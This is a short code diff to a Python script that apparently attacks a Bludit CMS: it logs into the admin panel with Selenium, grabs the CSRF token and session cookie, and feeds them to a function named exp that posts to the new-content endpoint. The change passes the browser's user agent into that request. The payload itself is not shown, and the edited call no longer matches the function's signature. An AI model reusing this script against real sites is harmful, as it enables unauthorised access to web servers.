@@ -30,14 +30,15 @@ def login(host):
     driver.find_element_by_xpath('/html/body/div[3]/div/div[1]/ul/li[4]/a').click()  # µã»÷×«Ð´ÎÄÕÂ
     csrftoken = driver.find_element_by_xpath('//*[@id="jstokenCSRF"]')
     ctoken = csrftoken.get_attribute('value')
-    return ctoken, cookie_b
+    user_agent = driver.execute_script("return navigator.userAgent;")
+    return ctoken, cookie_b,user_agent
 
 def exp(host, token, cookie_b):
     cookies = {
         'BLUDIT-KEY': cookie_b
     }
     headers = {
-        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0',
+        'User-Agent':user_agent ,
         'Content-Type': 'multipart/form-data; boundary=--------327107347321150223463725464476',
         'Origin': host,
         'Referer': host + '/admin/new-content',
@@ -75,4 +76,5 @@ if __name__ == '__main__':
     tup = login(h)
     token = tup[0]
     cookie_b = tup[1]
-    exp(h, token, cookie_b)
+    user_agent = tup[2]
+    exp(h, token, cookie_b,user_agent)
